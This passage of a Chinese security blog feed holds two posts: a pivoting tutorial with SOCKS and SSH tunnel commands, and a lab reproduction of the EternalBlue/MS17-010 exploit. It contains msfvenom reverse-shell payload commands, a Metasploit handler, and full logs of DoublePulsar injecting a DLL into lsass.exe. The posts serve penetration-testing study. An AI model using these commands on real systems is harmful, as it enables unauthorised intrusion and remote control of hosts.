socks代理工具</h3><p>常见的socks代理工具介绍如下<br>1.Earthworm     工具网址：<a href="http://rootkiter.com/EarthWorm" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm</a> </p><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p><p>目前已经有了最新版Termite，工具网址：<a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a> </p><p>2.reGeorg         工具网址：<a href="https://github.com/NoneNotNull/reGeorg" target="_blank" rel="noopener">https://github.com/NoneNotNull/reGeorg</a> </p><p>reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。</p><p>3.sSocks          工具网址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a> </p><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.14。</p><p>4.SocksCap64     工具网址：<a href="http://www.sockscap64.com" target="_blank" rel="noopener">http://www.sockscap64.com</a> (需翻墙)</p><p>SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。</p><p>5.proxychains     工具网址：<a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></p><p>Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上网，允許TCP和DNS通過代理隧道，支持HTTP、SOCKS4、SOCKS5類型的代理服务器，支持proxy chain，即可配置多个代理，同一個proxy chain可使用不同类型的代理服务器</p><h3 id="0x04-0-ssocks"><a href="#0x04-0-ssocks" class="headerlink" title="0x04.0 ssocks"></a>0x04.0 ssocks</h3><p>linux版<br>安装</p><pre><code>wget https://phoenixnap.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gztar -zxf ssocks-0.0.14.tar.gzcd ssocks-0.0.14./configure &amp;&amp; makecd src</code></pre><p>先在本地机器上执行,一般都是你自己的vps:</p><pre><code>./rcsocks -l 1080 -p 1234 -v</code></pre><p>目标机器上执行,实际渗透情况中加上 -b后台运行</p><pre><code>./rssocks -s  192.168.1.100(vps的ip):1234 -v</code></pre><p>然后通过本地各种socks代理工具配置代理即可,socks5 192.168.1.100 1080</p><p><a href="https://ci.appveyor.com/api/buildjobs/6oo804blxk09ld1q/artifacts/ssocks-win32-0.0.14.58.zip" target="_blank" rel="noopener">win版本</a>同理</p><h4 id="0x04-1-reGeorg-Proxychains代理"><a href="#0x04-1-reGeorg-Proxychains代理" class="headerlink" title="0x04.1 reGeorg+Proxychains代理"></a>0x04.1 reGeorg+Proxychains代理</h4><p>上传reGeorg的tunnel.jsp到服务器。访问链接，并转发到本地端口。</p><pre><code>python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-12.png" alt=""></p><p>使用设置proxychains的代理端口，进行访问，一般配合nmap和metasploit进行后续内网渗透。ps：proxychains不支持udp和icmp协议，所以使用nmap要加上<code>-sT -Pn</code>即使用tcp协议且不使用icmp协议。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-13.png" alt=""></p><h4 id="0x04-2-ew穿透"><a href="#0x04-2-ew穿透" class="headerlink" title="0x04.2 ew穿透"></a>0x04.2 ew穿透</h4><p>该工具借用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-14.png" alt=""></p><p>说明</p><pre><code>目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:    ssocksd   rcsocks   rssocks       lcx_slave lcx_tran  lcx_listen    其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。    其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。lcx 类别管道：    lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。    lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。    lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。    通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。    下面是一个三级跳的本地测试例子。。。    ./ew -s rcsocks -l 1080 -e 8888    ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999    ./ew -s lcx_listen -l 9999 -e 7777    ./ew -s rssocks -d 127.0.0.1 -e 7777    数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></pre><h5 id="0x04-2-1-正向SOCKS5服务器"><a href="#0x04-2-1-正向SOCKS5服务器" class="headerlink" title="0x04.2.1 正向SOCKS5服务器"></a>0x04.2.1 正向SOCKS5服务器</h5><p>当目标网络边界存在公网IP且可任意开监听端口</p><pre><code>ew_for_Win.exe -s ssocksd -l 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-15.png" alt=""></p><p>上述命令是在该机器（192.168.153.140）开启一个8888的正向连接端口。然后其它主机可通过设置代理为 192.168.153.140:8888添加这个代理。这里使用的是proxychains</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-16.png" alt=""></p><h4 id="0x04-2-2-反弹SOCKS5服务器"><a href="#0x04-2-2-反弹SOCKS5服务器" class="headerlink" title="0x04.2.2 反弹SOCKS5服务器"></a>0x04.2.2 反弹SOCKS5服务器</h4><p>当目标网络边界不存在公网IP，通过反弹方式创建socks代理。<br>先在一台具有公网 ip 的主机A上运行以下命令</p><pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-17.png" alt=""></p><p>意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给8888端口</p><p>在目标主机B上启动SOCKS5服务 并反弹到公网主机的8888端口</p><pre><code>ew_for_Win.exe -s rssocks -d 192.168.153.129 -e 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-18.png" alt=""></p><p>本地主机（192.168.153.129）然后通过添加公网192.168.153.129:1080这个代理,来访问内网机器（192.168.153.129）<br>当然如果本地主机如果是公网ip，就可以把在公网执行的步骤放在本地执行即可。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-19.png" alt=""></p><h4 id="0x04-2-3-二级网络环境（一）"><a href="#0x04-2-3-二级网络环境（一）" class="headerlink" title="0x04.2.3 二级网络环境（一）"></a>0x04.2.3 二级网络环境（一）</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机配有2块网卡，一块10.129.72.168连通外网，一块192.168.153.140只能连接内网B主机，无法访问内网其它资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-20.png" alt=""></p><p>先上传ew到B主机，利用ssocksd方式启动8888端口的SOCKS代理，命令如下</p><pre><code>ew_for_Win.exe -s ssocksd -l 8888</code></pre><p>然后在A主机执行</p><pre><code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-21.png" alt=""></p><p>含义是将1080端口收到的代理请求转交给B主机（192.168.153.138）的8888端口<br>然后My pc就可以通过A的外网代理10.129.72.168:1080访问B。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-22.png" alt=""></p><h4 id="0x04-2-4-二级网络环境（二）"><a href="#0x04-2-4-二级网络环境（二）" class="headerlink" title="0x04.2.4 二级网络环境（二）"></a>0x04.2.4 二级网络环境（二）</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-23.png" alt=""></p><p>这次操作有四步。</p><ol><li><p>在公网vps（45.xxx.xxx.72）添加转接隧道，将10800端口收到的代理请求转交给8888端口</p><p> ./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</p></li></ol><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-24.png" alt=""></p><p>2.B（192.168.153.138）主机正向开启8888端口</p><pre><code>ew_for_Win.exe -s ssocksd -l 9999</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-25.png" alt=""></p><p>3.A主机利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来</p><pre><code>ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-26.png" alt=""></p><p>现在my pc可通过访问45.xxx.xxx.72:10800来使用192.168.153.138主机提供的socks5代理，代理成功，vps会有rssocks cmd_socket OK!提示</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-27.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-28.png" alt=""></p><h3 id="0x05-ssh隧道代理转发"><a href="#0x05-ssh隧道代理转发" class="headerlink" title="0x05 ssh隧道代理转发"></a>0x05 ssh隧道代理转发</h3><p>ssh有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p><pre><code>本地访问127.0.0.1:port1就是host:port2(用的更多)ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发访问host:port2就是访问127.0.0.1:port1ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port可以将dmz_host的hostport端口转发到remote_ip的port端口ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类socket代理:ssh -qTfnN -D port remotehost参数详解：-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数-N Do not execute a remote command. 不执行远程命令，端口转发就用它了-L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport-R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport-D port 指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</code></pre><h4 id="0x05-1-ssh本地转发"><a href="#0x05-1-ssh本地转发" class="headerlink" title="0x05.1 ssh本地转发"></a>0x05.1 ssh本地转发</h4><p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口</p><pre><code>ssh -CfNg -L 1234 127.0.0.1:3306 root@45.32.31.121</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-29.png" alt=""></p><h4 id="0x05-2-ssh远程转发"><a href="#0x05-2-ssh远程转发" class="headerlink" title="0x05.2 ssh远程转发"></a>0x05.2 ssh远程转发</h4><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。</p><pre><code>ssh -CfNg -R 81:127.0.0.1:80 root@192.168.153.142</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-30.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-31.png" alt=""></p><p>现在在192.168.153.142访问127.0.0.1:81就是访问内网的服务器的80端口。</p><h4 id="0x05-2-ssh动态转发socks代理"><a href="#0x05-2-ssh动态转发socks代理" class="headerlink" title="0x05.2 ssh动态转发socks代理"></a>0x05.2 ssh动态转发socks代理</h4><p>把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接,该连接就经过ssh隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。</p><pre><code>ssh -qTfnN -D 1080  root@45.32.31.121</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-32.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-33.png" alt=""></p><h3 id="0x06-内网穿透平台"><a href="#0x06-内网穿透平台" class="headerlink" title="0x06 内网穿透平台"></a>0x06 内网穿透平台</h3><p>例如<a href="https://www.ngrok.cc/、https://natapp.cn/等" target="_blank" rel="noopener">https://www.ngrok.cc/、https://natapp.cn/等</a><br>以ngrok为例，注册并开通隧道</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-34.png" alt=""></p><p>下载对应的客户端，下载地址为：<a href="https://www.ngrok.cc/#down-client" target="_blank" rel="noopener">https://www.ngrok.cc/#down-client</a> 。<br>运行</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-35.png" alt=""></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-36.png" alt=""></p><p>生成backdoor。监听的IP为server.ngrok.cc的ip，端口为开通隧道时填写的远程端口</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56  LPORT=52524 -f exe &gt; shell.exe</code></pre><p>kali上执行</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-37.png" alt=""></p><h3 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h3><ol><li><a href="http://blog.creke.net/722.html" target="_blank" rel="noopener">SSH隧道与端口转发及内网穿透</a></li><li><a href="http://blog.csdn.net/xyyangkun/article/details/7025854" target="_blank" rel="noopener">SSH的端口转发</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-5234.html" target="_blank" rel="noopener">内网渗透随想</a></li><li><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">从零开始内网渗透学习</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tools-15000.html" target="_blank" rel="noopener">内网渗透中转发工具总结</a></li><li><a href="http://fuping.site/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/" target="_blank" rel="noopener">MS17-010漏洞检测与内网穿透技术的应用</a></li><li><a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">内网漫游之SOCKS代理大结局</a></li><li><a href="https://zhuanlan.zhihu.com/p/25423394" target="_blank" rel="noopener">正向代理和反向代理的区别</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近尝试了一些内网端口的转发和内网穿透，现在一起总结一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="experience" scheme="http://zerokeeper.github.io/categories/experience/"/>
    
    
      <category term="端口转发" scheme="http://zerokeeper.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    
      <category term="内网渗透" scheme="http://zerokeeper.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NSA Eternalblue SMB远程溢出复现</title>
    <link href="http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html"/>
    <id>http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html</id>
    <published>2017-04-24T04:57:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><p>这个应该和当年的ms08-067影响一样，现在微软编号MS17-010。<br><a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">Shadowbroker放出的NSA攻击工具</a><br>攻击机：<br>ip：192.168.153.137<br>win7 pro 64位，<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">python2.6.6</a>，<a href="https://nchc.dl.sourceforge.net/project/pywin32/pywin32/Build%20221/pywin32-221.win32-py2.6.exe" target="_blank" rel="noopener">pywin32</a>，<a href="https://pentestbox.org/zh/" target="_blank" rel="noopener">pentestbox</a><br>pentestbox是要用metasploite，也可以用kali。<br>靶机：<br>ip：192.168.153.138<br>win7 pro 64位</p><h3 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h3><p>现在metasploite已经可以检测了，在metasploit-framework/modules/auxiliary/scanner/smb目录下，<code>wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</code><br>使用如下</p><pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms_17_010msf auxiliary(smb_ms_17_010) &gt; show optionsModule options (auxiliary/scanner/smb/smb_ms_17_010):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   RHOSTS                      yes       The target address range or CIDR identifier   RPORT      445              yes       The SMB service port   SMBDomain  .                no        The Windows domain to use for authentication   SMBPass                     no        The password for the specified username   SMBUser                     no        The username to authenticate as   THREADS    1                yes       The number of concurrent threadsmsf auxiliary(smb_ms_17_010) &gt; set rhosts 192.168.153.138rhosts =&gt; 192.168.153.138msf auxiliary(smb_ms_17_010) &gt; run[*] 192.168.153.138:445   - Connected to \\192.168.153.138\IPC$ with TID = 2048[*] 192.168.153.138:445   - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0[!] 192.168.153.138:445   - Host is likely VULNERABLE to MS17-010![*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf auxiliary(smb_ms_17_010) &gt;</code></pre><p>存在该漏洞。<br>安装好环境后，在win 7攻击机器上切换到NSA攻击工具的windows目录，打开终端输入:python fb.py</p><pre><code>C:\Users\zero\Documents\shadowbroker-master\windowsλ python fb.py--[ Version 3.5.1[*] Loading Plugins[*] Initializing Fuzzbunch v3.5.1[*] Adding Global Variables[+] Set ResourcesDir =&gt; D:\DSZOPSDISK\Resources[+] Set Color =&gt; True[+] Set ShowHiddenParameters =&gt; False[+] Set NetworkTimeout =&gt; 60[+] Set LogDir =&gt; D:\logs[*] Autorun ONImplantConfig Autorun List==========================  0) prompt confirm  1) executeExploit Autorun List====================  0) apply  1) touch all  2) prompt confirm  3) executeSpecial Autorun List====================  0) apply  1) touch all  2) prompt confirm  3) executePayload Autorun List====================  0) apply  1) prompt confirm  2) execute[+] Set FbStorage =&gt; C:\Users\zero\Documents\shadowbroker-master\windows\storage[*] Retargetting Session[?] Default Target IP Address [] : 192.168.153.138[?] Default Callback IP Address [] : 192.168.153.137[?] Use Redirection [yes] : no[?] Base Log directory [D:\logs] : smb_logs[*] Checking C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs for projectsIndex     Project-----     -------0         Create a New Project[?] Project [0] :[?] New Project Name : test[?] Set target log directory to &apos;C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs\test\z192.168.153.138&apos;? [Yes] :[*] Initializing Global State[+] Set TargetIp =&gt; 192.168.153.138[+] Set CallbackIp =&gt; 192.168.153.137[!] Redirection OFF[+] Set LogDir =&gt; C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs\test\z192.168.153.138[+] Set Project =&gt; testfb &gt; use eterEternalblue     Eternalchampion Eternalromance  Eternalsynergyfb &gt; use Eternalblue[!] Entering Plugin Context :: Eternalblue[*] Applying Global Variables[+] Set NetworkTimeout =&gt; 60[+] Set TargetIp =&gt; 192.168.153.138[*] Applying Session Parameters[*] Running Exploit Touches[!] Enter Prompt Mode :: EternalblueModule: Eternalblue===================Name                  Value----                  -----NetworkTimeout        60TargetIp              192.168.153.138TargetPort            445VerifyTarget          TrueVerifyBackdoor        TrueMaxExploitAttempts    3GroomAllocations      12Target                WIN72K8R2[!] plugin variables are valid[?] Prompt For Variable Settings? [Yes] :[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.[?] NetworkTimeout [60] :[*]  TargetIp :: Target IP Address[?] TargetIp [192.168.153.138] :[*]  TargetPort :: Port used by the SMB service for exploit connection[?] TargetPort [445] :[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.[?] VerifyTarget [True] :[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.[?] VerifyBackdoor [True] :[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.[?] MaxExploitAttempts [3] :[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.[?] GroomAllocations [12] :[*]  Target :: Operating System, Service Pack, and Architecture of target OS    0) XP            Windows XP 32-Bit All Service Packs   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs[?] Target [1] :[!] Preparing to Execute Eternalblue[*]  Mode :: Delivery mechanism   *0) DANE     Forward deployment via DARINGNEOPHYTE    1) FB       Traditional deployment from within FUZZBUNCH[?] Mode [0] : 1[+] Run Mode: FB[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] :[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Local Tunnel - local-tunnel-1[?] Destination IP [192.168.153.138] :[?] Destination Port [445] :[+] (TCP) Local 192.168.153.138:445[+] Configure Plugin Remote TunnelsModule: Eternalblue===================Name                  Value----                  -----DaveProxyPort         0NetworkTimeout        60TargetIp              192.168.153.138TargetPort            445VerifyTarget          TrueVerifyBackdoor        TrueMaxExploitAttempts    3GroomAllocations      12ShellcodeBufferTarget                WIN72K8R2[?] Execute Plugin? [Yes] :[*] Executing Plugin[*] Connecting to target for exploitation.    [+] Connection established for exploitation.[*] Pinging backdoor...    [+] Backdoor returned code: 10 - Success!    [+] Ping returned Target architecture: x64 (64-bit)    [+] Backdoor is already installed -- nothing to be done.[*] CORE sent serialized output blob (2 bytes):0x00000000  08 01                                            ..[*] Received output parameters from CORE[+] CORE terminated with status code 0x00000000[+] Eternalblue Succeededfb Special (Eternalblue) &gt;</code></pre><p>看到succeeded了。接着用msfvenom生成dll。根据靶机的位数生成32或者64位的。</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.153.137 LPORT=8089 -f dll &gt; 64.dll</code></pre><p>将dll拷贝到c盘根目录。并且在metasploite中开启handler监听。</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.153.137lhost =&gt; 192.168.153.137msf exploit(handler) &gt; set lport 8089lport =&gt; 8089msf exploit(handler) &gt; run[*] Started reverse TCP handler on 192.168.153.137:8089[*] Starting the payload handler...</code></pre><p>然后紧接着Eternalblue，接着执行use Doublepulsar</p><pre><code>fb Special (Eternalblue) &gt; use Doublepulsar[!] Entering Plugin Context :: Doublepulsar[*] Applying Global Variables[+] Set NetworkTimeout =&gt; 60[+] Set TargetIp =&gt; 192.168.153.138[*] Applying Session Parameters[!] Enter Prompt Mode :: DoublepulsarModule: Doublepulsar====================Name              Value----              -----NetworkTimeout    60TargetIp          192.168.153.138TargetPort        445OutputFileProtocol          SMBArchitecture      x86Function          OutputInstall[!] Plugin Variables are NOT Valid[?] Prompt For Variable Settings? [Yes] :[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.[?] NetworkTimeout [60] :[*]  TargetIp :: Target IP Address[?] TargetIp [192.168.153.138] :[*]  TargetPort :: Port used by the Double Pulsar back door[?] TargetPort [445] :[*]  Protocol :: Protocol for the backdoor to speak   *0) SMB     Ring 0 SMB (TCP 445) backdoor    1) RDP     Ring 0 RDP (TCP 3389) backdoor[?] Protocol [0] :[*]  Architecture :: Architecture of the target OS   *0) x86     x86 32-bits    1) x64     x64 64-bits[?] Architecture [0] : 1[+] Set Architecture =&gt; x64[*]  Function :: Operation for backdoor to perform   *0) OutputInstall     Only output the install shellcode to a binary file on disk.    1) Ping              Test for presence of backdoor    2) RunDLL            Use an APC to inject a DLL into a user mode process.    3) RunShellcode      Run raw shellcode    4) Uninstall         Remove&apos;s backdoor from system[?] Function [0] : 2[+] Set Function =&gt; RunDLL[*]  DllPayload :: DLL to inject into user mode[?] DllPayload [] :[*]  DllPayload :: DLL to inject into user mode[?] DllPayload [] : C:\64.dll[+] Set DllPayload =&gt; C:\64.dll[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call[?] DllOrdinal [1] :[*]  ProcessName :: Name of process to inject into[?] ProcessName [lsass.exe] :[*]  ProcessCommandLine :: Command line of process to inject into[?] ProcessCommandLine [] :[!] Preparing to Execute Doublepulsar[*] Redirection OFF[+] Configure Plugin Local Tunnels[+] Local Tunnel - local-tunnel-1[?] Destination IP [192.168.153.138] :[?] Destination Port [445] :[+] (TCP) Local 192.168.153.138:445[+] Configure Plugin Remote TunnelsModule: Doublepulsar====================Name                  Value----                  -----NetworkTimeout        60TargetIp              192.168.153.138TargetPort            445DllPayload            C:\64.dllDllOrdinal            1ProcessName           lsass.exeProcessCommandLineProtocol              SMBArchitecture          x64Function              RunDLL[?] Execute Plugin? [Yes] :[*] Executing Plugin[+] Selected Protocol SMB[.] Connecting to target...[+] Connected to target, pinging backdoor...        [+] Backdoor returned code: 10 - Success!        [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0xF79DA652    SMB Connection string is: Windows 7 Professional 7601 Service Pack 1    Target OS is: 7 x64    Target SP is: 1        [+] Backdoor installed        [+] DLL built        [.] Sending shellcode to inject DLL        [+] Backdoor returned code: 10 - Success!        [+] Backdoor returned code: 10 - Success!        [+] Backdoor returned code: 10 - Success!        [+] Command completed successfully[+] Doublepulsar Succeededfb Payload (Doublepulsar) &gt;</code></pre><p>Doublepulsar执行成功，此时msf已经收到了shell了。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/equation-smb.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-准备&quot;&gt;&lt;a href=&quot;#0x01-准备&quot; class=&quot;headerlink&quot; title=&quot;0x01 准备&quot;&gt;&lt;/a&gt;0x01 准备&lt;/h3&gt;&lt;p&gt;这个应该和当年的ms08-067影响一样，现在微软编号MS17-010。&lt;br&gt;&lt;a href=&quot;h
      
    
    </summary>
    
    
      <category term="penetration" scheme="http://zerokeeper.github.io/categories/penetration/"/>
    
    
      <category term="smb" scheme="http://zerokeeper.github.io/tags/smb/"/>
    
      <category term="溢出" scheme="http://zerokeeper.github.io/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>网易云音乐客户端远程命令执行复现</title>
    <link href="http://zerokeeper.github.io/penetration/netease-cloud-music-client-remote-command-execution-repeat.html"/>
    <id>http://zerokeeper.github.io/penetration/netease-cloud-music-client-remote-command-execution-repeat.html</id>
    <published>2017-04-23T22:32:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
